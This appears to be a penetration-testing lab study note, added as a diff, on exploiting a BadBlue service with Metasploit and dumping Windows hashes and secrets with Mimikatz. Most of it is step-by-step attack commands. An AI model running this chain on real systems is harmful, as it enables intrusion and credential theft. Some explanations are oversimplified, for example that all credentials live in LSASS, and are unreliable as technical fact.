@@ -1,0 +1,326 @@
+Dumping Hashes With Mimikatz
+
+## Mimikatz 
+
+It is a tool attackers and security testers use to extract Windows credentials from Memory.
+
+That can include:
+- password hashes
+- plaintext passwords
+- Kerberos tickets
+- cached credentials
+
+Hash
+When a windows stores a password , it does not store password  directly instead 
+A hash is like:
+- you put a password in
+- Windows runs it through a math function
+- it becomes a fixed-looking string
+
+Example idea:
+- Password: `hello123`
+- Hash: `2ac9cb7dc02b3c0083eb70898e549b63`
+
+**Local Security Authority Subsystem Service (LSASS)** is a **Windows process** that handles:
+
+- user logins
+- password verification
+- authentication
+- security policies
+
+👉 In simple words:
+
+> **LSASS = the part of Windows that checks “is this user allowed to log in?”**
+# Lab Demonstration
+
+nmap -sV <target-ip>
+If we see BadBlue httpd 2.7 service runinng
+service postgresql start && msfconsole
+search badblue
+use 1 (By the version he found)
+set RHOSTS <target-ip>
+run
+sysinfo
+getuid
+pgrep lsass
+migrate <mention the no>
+getuid
+load kiwi
+? (help command)
+lsa_dump_sam
+
+pwd
+cd C:\\
+mkdir temp
+upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ->Take a file from MY machine (Kali) and upload it to the target Windows machine.”
+shell
+dir
+.\mimikatz.exe
+privilege::debug
+lsadump::sam
+lsadump::secrets
+
+
+
+COMPLETE FLOW: Dumping Hashes with Mimikatz
+
+## 🎯 Goal:
+
+> Exploit target → get access → move to LSASS → dump credentials
+
+---
+
+# 🔍 1. Scan the Target
+
+```bash
+nmap -sV <target-ip>
+```
+
+👉 Why?
+
+- Find running services
+    
+- Identify vulnerable service (e.g., **BadBlue httpd 2.7**)
+    
+
+---
+
+# 💣 2. Exploit the Service
+
+```bash
+service postgresql start
+msfconsole
+search badblue
+use <module>
+set RHOSTS <target-ip>
+run
+```
+
+👉 What happens?
+
+- You exploit the service
+    
+- You get a **Meterpreter session**
+    
+
+👉 Translation:
+
+> “I now have access inside the victim machine”
+
+---
+
+# 🖥️ 3. Check Your Access
+
+```bash
+sysinfo
+getuid
+```
+
+👉 Why?
+
+- Confirm system info
+    
+- Check if you are admin
+    
+
+👉 Important:
+
+> Mimikatz needs **high privileges (Admin/SYSTEM)**
+
+---
+
+# 🧠 4. Find LSASS Process
+
+```bash
+pgrep lsass
+```
+
+👉 What this does:
+
+- Finds **PID of LSASS**
+    
+
+👉 Reminder:
+
+- LSASS = where credentials are stored
+    
+
+---
+
+# 🔄 5. Migrate to LSASS
+
+```bash
+migrate <lsass PID>
+getuid
+```
+
+👉 Why this step is CRITICAL:
+
+- Your current process ≠ contains credentials
+    
+- LSASS = contains credentials
+    
+
+👉 So you:
+
+> “Move your session into LSASS memory”
+
+---
+
+# 🔑 6. Load Mimikatz (Option 1 – Kiwi)
+
+```bash
+load kiwi
+```
+
+👉 This loads:
+
+- built-in Mimikatz inside Metasploit
+    
+
+---
+
+## Dump hashes using Kiwi
+
+```bash
+lsa_dump_sam
+```
+
+👉 What you get:
+
+- NTLM hashes from SAM database
+    
+
+---
+
+# 📦 7. OR Upload Mimikatz (Option 2 – Manual)
+
+```bash
+pwd
+cd C:\
+mkdir temp
+upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+```
+
+👉 Why?
+
+- Use full version of Mimikatz
+    
+- More powerful than kiwi
+    
+
+---
+
+# 🖥️ 8. Run Mimikatz
+
+```bash
+shell
+dir
+.\mimikatz.exe
+```
+
+👉 Now you are inside Mimikatz tool
+
+---
+
+# 🔓 9. Enable Debug Privileges
+
+```bash
+privilege::debug
+```
+
+👉 Why?
+
+- Needed to access LSASS memory
+    
+- Without this → access denied
+    
+
+---
+
+# 🔑 10. Dump Hashes
+
+```bash
+lsadump::sam
+```
+
+👉 Extracts:
+
+- user NTLM hashes from SAM
+    
+
+---
+
+# 🔐 11. Dump Secrets
+
+```bash
+lsadump::secrets
+```
+
+👉 Extracts:
+
+- cached credentials
+    
+- service account passwords
+    
+- sensitive system secrets
+    
+
+---
+
+# 🧠 FINAL UNDERSTANDING (IMPORTANT)
+
+## What you actually did:
+
+1. Found vulnerable service
+    
+2. Exploited it → got shell
+    
+3. Moved into LSASS (credential storage)
+    
+4. Used Mimikatz to extract:
+    
+    - hashes
+        
+    - secrets
+        
+
+---
+
+# ❗ KEY CONCEPTS YOU MUST REMEMBER
+
+### 🔹 Mimikatz does NOT crack passwords
+
+👉 It **extracts existing credentials**
+
+---
+
+### 🔹 Why LSASS?
+
+👉 Because:
+
+> **All login credentials live in LSASS memory**
+
+---
+
+### 🔹 Why migrate?
+
+👉 Because:
+
+> Your session must be inside LSASS to read its memory
+
+---
+
+### 🔹 Why admin required?
+
+👉 Because:
+
+> LSASS is protected
+
+---
+
+# 🧠 SUPER SIMPLE FLOW (for revision)
+
+```
+Scan → Exploit → Get Shell → Find LSASS → Migrate → Run Mimikatz → Dump hashes
+```
